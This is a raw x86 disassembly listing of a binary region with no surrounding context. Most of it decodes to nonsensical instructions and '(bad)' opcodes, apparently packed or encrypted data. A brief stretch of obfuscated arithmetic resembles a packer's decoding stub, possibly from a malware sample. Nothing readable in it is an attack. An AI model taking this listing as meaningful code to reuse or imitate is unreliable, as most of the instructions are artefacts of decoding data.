  41a359:	mov    WORD PTR [ebx-0x6ee63425],ds
  41a35f:	fld    DWORD PTR [ecx]
  41a361:	fs inc ebx
  41a363:	sub    eax,0x86244aaf
  41a368:	cdq    
  41a369:	xor    edx,DWORD PTR [ecx+0x64]
  41a36c:	and    eax,0x51aa2b8d
  41a371:	setb   BYTE PTR [ecx]
  41a374:	mov    BYTE PTR [ecx+0x3e],dl
  41a377:	lea    edi,[ecx+eax*8]
  41a37a:	jae    0x41a3b7
  41a37c:	lock shl DWORD PTR [edi+0x411dde15],0x1f
  41a384:	push   edi
  41a385:	jmp    0x41a3f7
  41a387:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a388:	cs inc edx
  41a38a:	push   esi
  41a38b:	or     al,BYTE PTR [ebp+ecx*2+0x59]
  41a38f:	mov    dl,BYTE PTR [ebp+0x76]
  41a392:	add    DWORD PTR [eax-0x24],eax
  41a395:	adc    eax,0x3cfb291c
  41a39a:	ret    0x66af
  41a39d:	jmp    0x73e181cf
  41a3a2:	clc    
  41a3a3:	mov    WORD PTR [ecx],ds
  41a3a5:	push   0xffffffb0
  41a3a7:	add    BYTE PTR [ebp-0x379cb379],ch
  41a3ad:	xchg   ebp,eax
  41a3ae:	jecxz  0x41a350
  41a3b0:	popa   
  41a3b1:	sar    DWORD PTR [ecx-0x12],cl
  41a3b4:	scas   al,BYTE PTR es:[edi]
  41a3b5:	imul   eax,DWORD PTR [ecx],0xffffffbe
  41a3b8:	fs inc ebp
  41a3ba:	push   esi
  41a3bb:	or     al,0x76
  41a3bd:	fdiv   QWORD PTR [ecx-0x32]
  41a3c0:	(bad)  
  41a3c2:	popa   
  41a3c3:	pop    es
  41a3c4:	cwde   
  41a3c5:	scas   eax,DWORD PTR es:[edi]
  41a3c6:	push   ebp
  41a3c7:	(bad)  
  41a3c8:	adc    al,0xca
  41a3ca:	imul   BYTE PTR [ebx]
  41a3cc:	push   0x71
  41a3ce:	cli    
  41a3cf:	test   BYTE PTR [esi+0x7d3b5c54],dh
  41a3d5:	ret    0x3c7b
  41a3d8:	inc    esp
  41a3d9:	pop    esi
  41a3da:	dec    esi
  41a3db:	dec    ecx
  41a3dc:	aaa    
  41a3dd:	mov    eax,ds:0x39fa8b52
  41a3e2:	out    0x47,eax
  41a3e4:	mov    eax,0x4029f42a
  41a3e9:	sbb    ebx,DWORD PTR [ebp-0x435ef0e2]
  41a3ef:	pop    ss
  41a3f0:	or     bh,BYTE PTR [edx]
  41a3f2:	enter  0x1334,0xdc
  41a3f6:	add    bh,dl
  41a3f8:	iret   
  41a3f9:	and    ch,BYTE PTR [ebx+0x758488e8]
  41a3ff:	xchg   ebx,eax
  41a400:	or     ch,BYTE PTR [edi+ebp*4-0xb]
  41a404:	faddp  st(6),st
  41a406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a407:	mov    eax,0xced360ee
  41a40c:	dec    edi
  41a40d:	fidiv  DWORD PTR [ecx+0x65]
  41a410:	in     al,0x98
  41a412:	add    bh,al
  41a414:	lods   eax,DWORD PTR ds:[esi]
  41a415:	popf   
  41a416:	push   esi
  41a417:	mov    ebx,0xfd4f0623
  41a41c:	push   esi
  41a41d:	mov    edi,0x27a8aaa3
  41a422:	mov    eax,DWORD PTR [ecx+0x7d]
  41a425:	sbb    esp,DWORD PTR [eax+ecx*4+0x52322415]
  41a42c:	scas   eax,DWORD PTR es:[edi]
  41a42d:	xchg   ebx,eax
  41a42e:	mov    ch,0xb3
  41a430:	popa   
  41a431:	pop    ss
  41a432:	fcom   st(1)
  41a434:	sub    ecx,DWORD PTR [eax]
  41a436:	mov    bl,0x5c
  41a438:	vpcmov xmm6,xmm0,XMMWORD PTR [eax+0x1],xmm4
  41a43f:	cmp    al,0xac
  41a441:	lods   eax,DWORD PTR ds:[esi]
  41a442:	sub    eax,0x2acb3b80
  41a447:	outs   dx,DWORD PTR ds:[esi]
  41a448:	lods   al,BYTE PTR ds:[esi]
  41a449:	cmp    ebp,edi
  41a44b:	mov    al,ds:0x4e86e2ad
  41a450:	or     al,0x12
  41a452:	(bad)  
  41a453:	mov    al,ds:0x65329e56
  41a458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a459:	shl    dh,0xe1
  41a45c:	fwait
  41a45d:	adc    ecx,DWORD PTR [ebp+0x27025bfc]
  41a463:	push   ss
  41a464:	cmp    al,BYTE PTR [ebx+0x8]
  41a467:	stos   DWORD PTR es:[edi],eax
  41a468:	ror    BYTE PTR [edx+0x17],0xdc
  41a46c:	rcr    BYTE PTR [eax],1
  41a46e:	test   al,0xc7
  41a470:	popf   
  41a471:	out    dx,al
  41a472:	ins    BYTE PTR es:[edi],dx
  41a473:	fs cmc 
  41a475:	adc    eax,ecx
  41a477:	cmp    esi,DWORD PTR [edi-0x771eb50c]
  41a47d:	clc    
  41a47e:	sbb    BYTE PTR [ebp-0x6f],0x52
  41a482:	mov    ecx,0x28367b2f
  41a487:	and    esp,edx
  41a489:	clc    
  41a48a:	and    al,0x0
  41a48c:	mov    al,0x31
  41a48e:	mov    al,ds:0xde8edc40
  41a493:	cdq    
  41a494:	pop    ss
  41a495:	xor    DWORD PTR [edi+0x6e],edx
  41a498:	out    0xd9,al
  41a49a:	int3   
  41a49b:	call   0x665a41e8
  41a4a0:	jno    0x41a51b
  41a4a2:	cs (bad) 
  41a4a4:	daa    
  41a4a5:	jecxz  0x41a45d
  41a4a7:	cs inc edi
  41a4a9:	jae    0x41a47d
  41a4ab:	hlt    
  41a4ac:	jb     0x41a4bc
  41a4ae:	push   0x2e0067d2
  41a4b3:	push   esi
  41a4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4b5:	xor    eax,0x3b6eaac3
  41a4ba:	aaa    
  41a4bb:	push   ebp
  41a4bc:	js     0x41a4b1
  41a4be:	cmc    
  41a4bf:	fdiv   QWORD PTR [ecx]
  41a4c1:	mov    ds:0xd26435e2,eax
  41a4c6:	sub    DWORD PTR [ecx+0x72976527],esi
  41a4cc:	dec    esi
  41a4cd:	cmp    esi,ebp
  41a4cf:	mov    ecx,0x1ec66923
  41a4d4:	fsubr  DWORD PTR [ebx]
  41a4d6:	xchg   DWORD PTR [edi-0x2a],ecx
  41a4d9:	or     bl,BYTE PTR [esp+ebx*4+0x61]
  41a4dd:	sub    al,0xef
  41a4df:	push   esp
  41a4e0:	sbb    DWORD PTR [edx],ecx
  41a4e2:	retf   0x3cbd
  41a4e5:	or     DWORD PTR [ecx+0x6050fba],esi
  41a4eb:	fistp  WORD PTR [eax+eiz*8]
  41a4ee:	mov    bl,0x97
  41a4f0:	imul   ebx,DWORD PTR [esi],0x1e
  41a4f3:	(bad)  
  41a4f4:	jecxz  0x41a4f1
  41a4f6:	std    
  41a4f7:	pop    ecx
  41a4f8:	mov    ebx,DWORD PTR [ebx-0x56fd78c9]
  41a4fe:	in     eax,0x8
  41a500:	pusha  
  41a501:	aas    
  41a502:	mov    WORD PTR [ecx-0x23],es
  41a505:	leave  
  41a506:	ss (bad) 
  41a508:	and    edi,eax
  41a50a:	aas    
  41a50b:	addr16 mov bh,0x29
  41a50e:	jo     0x41a51e
  41a510:	cmp    dl,dh
  41a512:	in     eax,dx
  41a513:	xchg   BYTE PTR [eax-0x4bef5f45],dl
  41a519:	stc    
  41a51a:	dec    eax
  41a51b:	or     al,dh
  41a51d:	xchg   edx,eax
  41a51e:	fwait
  41a51f:	movhps xmm1,QWORD PTR [ebx-0x7c]
  41a523:	xchg   ebx,eax
  41a524:	mov    ?,WORD PTR [esi-0x65]
  41a527:	adc    al,0x13
  41a529:	push   edi
  41a52a:	popa   
  41a52b:	in     al,0xc0
  41a52d:	jmp    0x6a462168
  41a532:	(bad)  
  41a533:	mov    esp,0xba75dd67
  41a538:	dec    ebx
  41a539:	out    0x69,eax
  41a53b:	stos   DWORD PTR es:[edi],eax
  41a53c:	push   ebx
  41a53d:	push   0xffffffbf
  41a53f:	pop    eax
  41a540:	ret    
  41a541:	inc    ecx
  41a542:	pop    ecx
  41a543:	shl    dl,cl
  41a545:	mov    DWORD PTR [ecx],ebp
  41a547:	cdq    
  41a548:	mov    ch,0x3b
  41a54a:	jae    0x41a5a6
  41a54c:	xchg   edx,eax
  41a54d:	inc    ebx
  41a54e:	push   edi
  41a54f:	xchg   DWORD PTR [edx-0x46],esi
  41a552:	mov    edi,0xbd4bce99
  41a557:	fsubr  DWORD PTR [edi]
  41a559:	ss call 0x78fbe17a
  41a55f:	sbb    cl,BYTE PTR ds:0x8e709281
  41a565:	lea    esp,[edi+0x4d]
  41a568:	push   0xffffffa2
  41a56a:	jecxz  0x41a516
  41a56c:	xor    ch,bl
  41a56e:	push   0x5005c93e
  41a573:	mov    ah,0x3a
  41a575:	push   edi
  41a576:	mov    ds:0xeda0333e,eax
  41a57b:	pop    ebx
  41a57c:	or     dh,BYTE PTR [edi-0x65]
  41a57f:	xchg   BYTE PTR [ecx],dh
  41a581:	add    al,0x2f
  41a583:	jp     0x41a5b8
  41a585:	in     eax,0xa7
  41a587:	lahf   
  41a588:	call   0x790f:0xf8e4643b
  41a58f:	sbb    cl,BYTE PTR [edi+0x4b]
  41a592:	call   0xcbbb:0x23aef5cf
  41a599:	mov    bh,0x68
  41a59b:	enter  0x2c5b,0xc0
  41a59f:	push   ecx
  41a5a0:	sbb    eax,0x7adf0d50
  41a5a5:	mov    edx,0xd4618e3e
  41a5aa:	xor    eax,0xfb664c4c
  41a5af:	push   ss
  41a5b0:	ret    0x3072
  41a5b3:	mov    bl,BYTE PTR [ecx-0x4458d546]
  41a5b9:	push   cs
  41a5ba:	nop
  41a5bb:	push   ecx
  41a5bc:	mov    cl,0x91
  41a5be:	inc    eax
  41a5bf:	adc    eax,0x6e56725b
  41a5c4:	ret    0x1b36
  41a5c7:	mov    bh,0x2f
  41a5c9:	push   0x35
  41a5cb:	ficomp WORD PTR [edx]
  41a5cd:	push   esi
  41a5ce:	and    bh,BYTE PTR [eax+0x5b]
  41a5d1:	js     0x41a641
  41a5d3:	imul   edi,edi,0x12
  41a5d6:	in     al,0x3d
  41a5d8:	std    
  41a5d9:	popf   
  41a5da:	push   es
  41a5db:	cwde   
  41a5dc:	adc    ecx,0x774c3955
  41a5e2:	dec    edi
  41a5e3:	test   DWORD PTR [edi],eax
  41a5e5:	fcmovbe st,st(5)
  41a5e7:	ja     0x41a5f7
  41a5e9:	sti    
  41a5ea:	mov    BYTE PTR [edx-0x77b80bef],0x58
  41a5f1:	fiadd  WORD PTR [ebp+0x52687099]
  41a5f7:	jne    0x41a678
  41a5f9:	mov    esp,0xa3c80770
  41a5fe:	xlat   BYTE PTR ds:[ebx]
  41a5ff:	and    esp,DWORD PTR [edx]
  41a601:	icebp  
  41a602:	imul   edx,DWORD PTR [ebx-0xf],0xffffff9b
  41a606:	adc    eax,0x1bccc048
  41a60b:	ins    DWORD PTR es:[edi],dx
  41a60c:	adc    al,0x6f
  41a60e:	mov    edi,DWORD PTR [esi+0x61]
  41a611:	stos   DWORD PTR es:[edi],eax
  41a612:	push   esi
  41a613:	fisubr WORD PTR [esi+0x50]
  41a616:	lods   al,BYTE PTR ds:[esi]
  41a617:	fldenv [edi]
  41a619:	pop    edx
  41a61a:	js     0x41a622
  41a61c:	ror    DWORD PTR [edx+0x3a2b7875],0x41
  41a623:	sbb    BYTE PTR ds:0x535c5309,bl
  41a629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62a:	mov    dl,0xd0
  41a62c:	dec    edx
  41a62d:	mov    dh,0x2a
  41a62f:	aad    0x55
  41a631:	mov    cl,0x5a
  41a633:	bound  ebp,QWORD PTR [ebx-0x5c99a767]
  41a639:	dec    esi
  41a63b:	cld    
  41a63c:	xchg   BYTE PTR [ebp+0xe],al
  41a63f:	(bad)  
  41a640:	out    dx,eax
  41a641:	inc    eax
  41a642:	enter  0xe582,0xe0
  41a646:	std    
  41a647:	pop    DWORD PTR [edi]
  41a649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a64a:	js     0x41a68a
  41a64c:	jecxz  0x41a669
  41a64e:	(bad)  
  41a64f:	adc    BYTE PTR [ebp-0x18],cl
  41a652:	push   es
  41a653:	nop
  41a654:	inc    ecx
  41a655:	fst    DWORD PTR [esi+0x16dca170]
  41a65b:	stos   BYTE PTR es:[edi],al
  41a65c:	(bad)  
  41a65d:	mov    dh,0x18
  41a65f:	(bad)  
  41a660:	call   0x75e9:0x157bb64f
  41a667:	cmp    BYTE PTR [edi],dh
  41a669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a66a:	and    al,0xc6
  41a66d:	push   edx
  41a66e:	stos   BYTE PTR es:[edi],al
  41a66f:	sbb    DWORD PTR [ebx-0x6f],ebx
  41a672:	lea    ecx,ds:0x243c9418
  41a678:	in     al,0x72
  41a67a:	imul   BYTE PTR [esi-0x40]
  41a67d:	stos   DWORD PTR es:[edi],eax
  41a67e:	pop    es
  41a67f:	cli    
  41a680:	retf   
  41a681:	mov    cl,0xd3
  41a683:	ror    BYTE PTR [edx-0x67eabad9],1
  41a689:	jmp    DWORD PTR [edi+ecx*8-0x2212c7b1]
  41a690:	jmp    0x41a632
  41a692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a693:	int    0x5f
  41a695:	aaa    
  41a696:	shl    BYTE PTR [edi+0x7f944cc8],0x38
  41a69d:	and    dl,BYTE PTR [edi+0x7d41d1de]
  41a6a3:	aam    0xf5
  41a6a5:	ret    
  41a6a6:	rcl    DWORD PTR [edx-0xfece994],cl
  41a6ac:	mov    esi,0x51b819b5
  41a6b1:	xor    DWORD PTR [edx+edi*8],ecx
  41a6b4:	call   FWORD PTR [ebp-0x4]
  41a6b7:	xchg   esi,eax
  41a6b8:	add    DWORD PTR [esp+ebp*4-0x1dc9805],ebp
  41a6bf:	xchg   esi,eax
  41a6c0:	mov    edx,0x7512b42c
  41a6c5:	loope  0x41a6bb
  41a6c7:	mov    eax,?
  41a6c9:	pop    edi
  41a6ca:	scas   eax,DWORD PTR es:[edi]
  41a6cb:	aam    0x7e
  41a6cd:	sar    ecx,0xc6
  41a6d0:	fild   QWORD PTR [esi+0x369556da]
  41a6d6:	div    DWORD PTR [esi-0x7d]
  41a6d9:	sti    
  41a6da:	xchg   esp,eax
  41a6db:	mov    eax,0xbebeb95
  41a6e0:	sahf   
  41a6e1:	mov    dl,0x8d
  41a6e3:	jg     0x41a695
  41a6e5:	sbb    ebp,DWORD PTR [eax]
  41a6e7:	jge    0x41a6b7
  41a6e9:	dec    ebx
  41a6ea:	cmp    ebp,DWORD PTR [edx-0x5673ed7f]
  41a6f0:	nop
  41a6f1:	aad    0xbd
  41a6f3:	push   eax
  41a6f4:	arpl   WORD PTR [edx+0x2f],si
  41a6f7:	rol    dl,cl
  41a6f9:	stos   DWORD PTR es:[edi],eax
  41a6fa:	data16 fimul WORD PTR [esi+0x35963d1c]
  41a701:	daa    
  41a702:	adc    ah,BYTE PTR [esi+0xc]
  41a705:	sbb    eax,ebx
  41a707:	sbb    al,BYTE PTR [ebx+0xb065bf3]
  41a70d:	or     BYTE PTR [ebx],dh
  41a70f:	aad    0x16
  41a711:	sub    eax,DWORD PTR [edi-0x2fe3ccee]
  41a717:	ins    DWORD PTR es:[edi],dx
  41a718:	inc    eax
  41a719:	mov    bl,0x2a
  41a71b:	push   edi
  41a71c:	outs   dx,BYTE PTR ds:[esi]
  41a71d:	sbb    edi,DWORD PTR [edi]
  41a71f:	cmc    
  41a720:	fwait
  41a721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a722:	jnp    0x41a792
  41a724:	mov    WORD PTR [ebx+esi*8],fs
  41a727:	lahf   
  41a728:	mov    al,ds:0x8a6cec56
  41a72d:	cmp    esp,ecx
  41a72f:	ret    
  41a730:	scas   eax,DWORD PTR es:[edi]
  41a731:	mov    edx,0x55259d1b
  41a736:	(bad)  
  41a737:	call   0x3723f88a
  41a73c:	and    al,0x0
  41a73e:	push   ebx
  41a73f:	lock inc ebp
  41a741:	add    dh,ch
  41a743:	stc    
  41a744:	in     eax,0x99
  41a746:	nop
  41a747:	mov    al,ds:0xe0860d53
  41a74c:	scas   al,BYTE PTR es:[edi]
  41a74d:	push   cs
  41a74e:	add    eax,DWORD PTR [ebp+0x7e]
  41a751:	ja     0x41a6e1
  41a753:	or     BYTE PTR [edx+0x14b72fe0],cl
  41a759:	les    esp,FWORD PTR [edi]
  41a75b:	iret   
  41a75c:	cmp    BYTE PTR [ebx+0x2a],al
  41a75f:	sbb    esi,edx
  41a761:	out    dx,eax
  41a762:	sub    al,0x3e
  41a764:	shl    DWORD PTR [edx],1
  41a766:	data16 xor al,0x67
  41a769:	adc    bl,BYTE PTR [ebp+0x25e32944]
  41a76f:	and    bp,WORD PTR [ecx]
  41a772:	(bad)  
  41a773:	fst    DWORD PTR [ecx+0x41ff2779]
  41a779:	cmp    cl,BYTE PTR [ebx]
  41a77b:	adc    edi,DWORD PTR [ecx]
  41a77d:	add    DWORD PTR [ecx+0x2d],edx
  41a780:	mov    ds,WORD PTR [ebx+esi*4-0x71]
  41a784:	jmp    0xb777:0xd8e3405a
  41a78b:	lock fcmovnb st,st(5)
  41a78e:	push   es
  41a78f:	mov    esp,0xe4f06be7
  41a794:	jae    0x41a7f1
  41a796:	xchg   esp,esi
  41a798:	add    DWORD PTR [eax-0x56],esi
  41a79b:	rcr    BYTE PTR [edx],1
  41a79d:	jp     0x41a79a
  41a79f:	add    DWORD PTR [ecx-0x72764aa0],0xb765fb37
  41a7a9:	or     edx,esi
  41a7ab:	mov    eax,ds:0xc5bfc2c4
  41a7b0:	test   BYTE PTR [esp+edx*8],bh
  41a7b3:	fsubr  QWORD PTR [ecx]
  41a7b6:	into   
  41a7b7:	add    DWORD PTR [ebx-0x4bc707f4],ebp
  41a7bd:	loop   0x41a814
  41a7bf:	dec    ebx
  41a7c0:	push   cs
  41a7c1:	std    
  41a7c2:	mov    dx,WORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x609748d2]
  41a82d:	pop    ebx
  41a82e:	nop
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	outs   dx,DWORD PTR ds:[esi]
  41a837:	loope  0x41a8b4
  41a839:	pop    ecx
  41a83a:	sub    eax,0xe52b1777
  41a83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a840:	jecxz  0x41a82b
  41a842:	test   al,0xed
  41a844:	inc    ebp
  41a845:	icebp  
  41a846:	loopne 0x41a7fa
  41a848:	call   0x76304057
  41a84d:	cmp    eax,DWORD PTR [ebx-0x55]
  41a850:	outs   dx,DWORD PTR ds:[esi]
  41a851:	pop    edi
  41a852:	pop    esp
  41a853:	inc    esp
  41a854:	sbb    edx,DWORD PTR [ebx]
  41a856:	sub    DWORD PTR [edx+0x676d970a],ecx
  41a85c:	stc    
  41a85d:	jbe    0x41a88a
  41a85f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a860:	sbb    DWORD PTR [eax-0x7dce7091],esp
  41a866:	xor    edx,esi
  41a868:	pop    edi
  41a869:	mov    ?,WORD PTR [ebp-0x7d]
  41a86c:	add    al,0x17
  41a86e:	int    0x1c
  41a870:	dec    ebp
  41a871:	lds    ecx,FWORD PTR [edi-0x7e]
  41a874:	pop    ss
  41a875:	rol    BYTE PTR [edx+0x62],1
  41a878:	or     eax,0x5b9ccee1
  41a87d:	adc    eax,DWORD PTR ss:[edx]
  41a880:	(bad)  
  41a881:	push   ebx
  41a882:	or     BYTE PTR [eax+eax*2-0x26bb4b64],al
  41a889:	push   esp
  41a88a:	pop    ecx
  41a88b:	ret    
  41a88c:	leave  
  41a88d:	pop    eax
  41a88e:	out    dx,al
  41a88f:	(bad)  
  41a890:	or     DWORD PTR [edi+eiz*2],ecx
  41a893:	xlat   BYTE PTR ds:[ebx]
  41a894:	dec    ebx
  41a895:	rol    BYTE PTR [ecx],cl
  41a897:	lods   al,BYTE PTR ds:[esi]
  41a898:	jg     0x41a86f
  41a89a:	xchg   ebp,eax
  41a89b:	mov    al,ds:0x4ace454e
  41a8a0:	xor    edx,edi
  41a8a2:	das    
  41a8a3:	mov    ebx,0x9921411c
  41a8a8:	and    cl,dl
  41a8aa:	push   cs
  41a8ab:	(bad)  
  41a8ae:	in     eax,0x11
  41a8b0:	scas   eax,DWORD PTR es:[edi]
  41a8b1:	test   eax,0x6440ef3
  41a8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b7:	retf   0x638e
  41a8ba:	jl     0x41a8ca
  41a8bc:	test   dh,dl
  41a8be:	inc    esi
  41a8bf:	xchg   esp,eax
  41a8c0:	sbb    dl,BYTE PTR [ebx]
  41a8c2:	outs   dx,BYTE PTR ds:[esi]
  41a8c3:	mov    ecx,0x8f1fcc26
  41a8c8:	dec    ebp
  41a8c9:	pop    eax
  41a8ca:	mov    esi,0xc1c7972a
  41a8cf:	cmp    ch,0xdf
  41a8d2:	daa    
  41a8d3:	ja     0x41a8bb
  41a8d5:	mov    ds:0xd72ea3cc,eax
  41a8da:	ret    
  41a8db:	outs   dx,BYTE PTR ds:[esi]
  41a8dc:	retf   
  41a8dd:	sub    esp,DWORD PTR [eax]
  41a8df:	mov    cs,WORD PTR ds:0x414f8d72
  41a8e5:	or     BYTE PTR [edx],ah
  41a8e7:	clc    
  41a8e8:	or     ecx,eax
  41a8ea:	jg     0x41a927
  41a8ec:	rcl    ch,cl
  41a8ee:	adc    al,0x6a
  41a8f0:	in     al,0x19
  41a8f2:	dec    eax
  41a8f3:	dec    cx
  41a8f5:	sbb    esp,DWORD PTR [edx+0x30]
  41a8f8:	aas    
  41a8f9:	sti    
  41a8fa:	shr    BYTE PTR [edx+esi*8+0x74],cl
  41a8fe:	mov    ds:0x3ad5665b,al
  41a903:	lock lods eax,DWORD PTR ds:[esi]
  41a905:	sbb    bh,ch
  41a907:	(bad)  
  41a908:	push   0x1ed71d6c
  41a90d:	mov    eax,0x47ef47c
  41a912:	dec    edi
  41a913:	daa    
  41a914:	shr    BYTE PTR [edi+0x694f84b],cl
  41a91a:	jmp    0xd0cc976f
  41a91f:	xlat   BYTE PTR ds:[ebx]
  41a920:	cdq    
  41a921:	mov    ebp,0xd2ec0a1f
  41a926:	xchg   ebp,eax
  41a927:	xor    al,0xb4
  41a929:	test   eax,0xc73cfad7
  41a92e:	ret    0x4772
  41a931:	hlt    
  41a932:	lods   al,BYTE PTR ds:[esi]
  41a933:	ja     0x41a990
  41a935:	or     DWORD PTR [ebx],0x309b3d57
  41a93b:	mov    eax,0x1307ca8f
  41a940:	xor    ah,BYTE PTR [edi]
  41a942:	xor    BYTE PTR [edi+0x7e],ah
  41a945:	jl     0x41a8c7
  41a947:	ret    
  41a948:	and    BYTE PTR [edx+ebx*2],cl
  41a94b:	dec    esi
  41a94c:	jns    0x41a939
  41a94e:	add    esi,edx
  41a950:	in     eax,dx
  41a951:	adc    al,0x1d
  41a953:	ror    DWORD PTR [esi],1
  41a955:	icebp  
  41a956:	and    ecx,DWORD PTR [eax+0x22]
  41a959:	inc    edx
  41a95a:	sbb    bh,BYTE PTR [edx+0x392bbd61]
  41a960:	xor    eax,0x199279a7
  41a965:	(bad)  
  41a966:	push   cs
  41a967:	adc    BYTE PTR [edi+eiz*4],dl
  41a96a:	adc    eax,0xf7c40b25
  41a96f:	(bad)  
  41a970:	cmp    esi,DWORD PTR [esi+0x1c]
  41a973:	ud2    
  41a975:	add    bl,bl
  41a977:	pop    ecx
  41a978:	mov    bl,0x1
  41a97a:	jne    0x41a98d
  41a97c:	(bad)
  41a97f:	pop    eax
  41a980:	push   ecx
  41a981:	in     al,0x61
  41a983:	pop    edi
  41a984:	outs   dx,BYTE PTR ds:[esi]
  41a985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a986:	jmp    0x41a91b
  41a988:	pop    es
  41a989:	push   ds
  41a98a:	pop    ebx
  41a98b:	inc    ebx
  41a98c:	hlt    
  41a98d:	pop    es
  41a98e:	xchg   edi,eax
  41a98f:	std    
  41a990:	mov    esp,0x883f57ef
  41a995:	push   esi
  41a996:	add    al,0x85
  41a998:	mov    dl,0xbd
  41a99a:	bound  edi,QWORD PTR [esi-0x32a9899c]
  41a9a0:	jg     0x41a958
  41a9a2:	into   
  41a9a3:	aaa    
  41a9a4:	ins    BYTE PTR es:[edi],dx
  41a9a5:	cdq    
  41a9a6:	xor    eax,DWORD PTR [esp+ebp*4+0x1eb8d7ee]
  41a9ad:	and    eax,0x74adfb58
  41a9b2:	fadd   QWORD PTR [ecx]
  41a9b4:	fisub  DWORD PTR [eax-0xbbd9c3a]
  41a9ba:	dec    eax
  41a9bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9bc:	aad    0xa5
  41a9be:	or     BYTE PTR ds:0xc2bd7a1e,cl
  41a9c4:	or     eax,0xdbd92c63
  41a9c9:	dec    eax
  41a9ca:	xor    DWORD PTR [ecx+esi*1+0x63],0x59
  41a9cf:	jge    0x41a9e7
  41a9d1:	xor    edi,ebp
  41a9d3:	aam    0xc0
  41a9d5:	clc    
  41a9d6:	push   edx
  41a9d7:	lods   al,BYTE PTR ds:[esi]
  41a9d8:	into   
  41a9d9:	jmp    0x305d5ccc
  41a9de:	add    al,0x1f
  41a9e0:	xchg   esp,eax
  41a9e1:	cmc    
  41a9e2:	xor    BYTE PTR [edi+0x5846c6a0],ch
  41a9e8:	adc    ch,BYTE PTR [edx]
  41a9ea:	(bad)  
  41a9eb:	and    al,0xb6
  41a9ed:	adc    eax,0x825879a1
  41a9f2:	cdq    
  41a9f3:	out    0x69,eax
  41a9f5:	jne    0x41a9de
  41a9f7:	(bad)  
  41a9f8:	xor    al,0xe1
  41a9fa:	jp     0x41a9f3
  41a9fc:	call   0x8adc:0x20f2f593
  41aa03:	and    DWORD PTR [ebx],ecx
  41aa05:	and    bh,dl
  41aa07:	mov    dh,0x1
  41aa09:	aaa    
  41aa0a:	xor    eax,0x78fd5a
  41aa0f:	test   ecx,ebp
  41aa11:	pop    eax
  41aa12:	ins    BYTE PTR es:[edi],dx
  41aa13:	arpl   WORD PTR [eax+0x1b],dx
  41aa16:	jne    0x41aa63
  41aa18:	call   0xc43c:0xb56b46c6
  41aa1f:	xor    al,0xc2
  41aa21:	inc    eax
  41aa22:	jae    0x41a9f3
  41aa24:	outs   dx,DWORD PTR ds:[esi]
  41aa25:	cmp    cl,0xf8
  41aa28:	xchg   ebp,eax
  41aa29:	and    eax,ecx
  41aa2b:	jecxz  0x41a9c9
  41aa2d:	ins    BYTE PTR es:[edi],dx
  41aa2e:	clc    
  41aa2f:	sar    esi,0xe4
  41aa32:	es mov edi,0x3e72f0a7
  41aa38:	jle    0x41aaa8
  41aa3a:	leave  
  41aa3b:	xor    DWORD PTR [esi-0x9],eax
  41aa3e:	cmp    DWORD PTR [eax],edx
  41aa40:	out    0x4b,al
  41aa42:	adc    DWORD PTR [edi],ecx
  41aa44:	add    edi,ebx
  41aa46:	pop    es
  41aa47:	cdq    
  41aa48:	pop    ss
  41aa49:	data16 int3 
  41aa4b:	repz dec eax
  41aa4d:	int    0x64
  41aa4f:	lds    ecx,FWORD PTR [esi]
  41aa51:	int    0xee
  41aa53:	push   ecx
  41aa54:	retf   
  41aa55:	jge    0x41aa13
  41aa57:	sub    BYTE PTR [ebp+0x20],ah
  41aa5a:	cmp    al,al
  41aa5c:	sub    eax,0x3683ccc
  41aa61:	add    eax,0x862add51
  41aa66:	and    BYTE PTR [edx-0x226c72c1],al
  41aa6c:	cmp    eax,0xbf756726
  41aa71:	sbb    DWORD PTR ds:0x84f007ac,esp
  41aa77:	pop    esi
  41aa78:	lahf   
  41aa79:	into   
  41aa7a:	cmp    al,BYTE PTR [esi-0xa3b4de2]
  41aa80:	cmp    BYTE PTR [edi],dl
  41aa82:	or     eax,0x8e457d4c
  41aa87:	enter  0xda88,0x75
  41aa8b:	shl    DWORD PTR [ebp-0x3c],0xf2
